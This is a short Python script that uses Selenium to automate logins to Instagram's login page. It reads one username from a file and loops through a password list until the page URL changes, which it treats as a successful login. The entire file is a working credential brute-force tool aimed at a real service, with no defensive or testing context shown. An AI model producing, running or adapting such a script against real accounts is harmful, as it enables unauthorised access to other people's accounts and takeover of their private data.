from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Prompt the user for the file paths
username_file = input("Enter the path of the username file: ")
password_file = input("Enter the path of the password file: ")

# Read the username from the provided file
with open(username_file, 'r') as file:
    username = file.readline().strip()

# Read all passwords from the provided file
with open(password_file, 'r') as file:
    passwords = [line.strip() for line in file.readlines()]

# Set up the browser (Chrome in this case)
driver = webdriver.Chrome()  # Or use Firefox with webdriver.Firefox()

# Open Instagram login page
driver.get("https://www.instagram.com/accounts/login/")
time.sleep(5)  # Wait for the page to load

# Save the login page URL to check later for URL changes
login_page_url = driver.current_url

# Try each password one by one
login_successful = False
for password in passwords:
    # Refresh the page after each attempt to reset the login form
    driver.refresh()
    time.sleep(5)  # Wait for the page to reload

    # Locate the username and password fields
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")
    
    # Clear the username and password fields in case of retry
    username_field.clear()
    password_field.clear()

    # Enter username and password
    username_field.send_keys(username)
    password_field.send_keys(password)

    # Submit the form
    password_field.send_keys(Keys.RETURN)

    # Wait for a while to allow potential redirection after login
    time.sleep(10)

    # Check if the URL has changed (indicating successful login)
    current_url = driver.current_url
    if current_url != login_page_url:
        login_successful = True
        print(f"Login successful with username: {username} and password: {password}")
        break
    else:
        print(f"Login failed with password: {password}")

# If no password worked, print a message
if not login_successful:
    print("All passwords failed. Could not log in.")

# Optionally, close the browser
driver.quit()
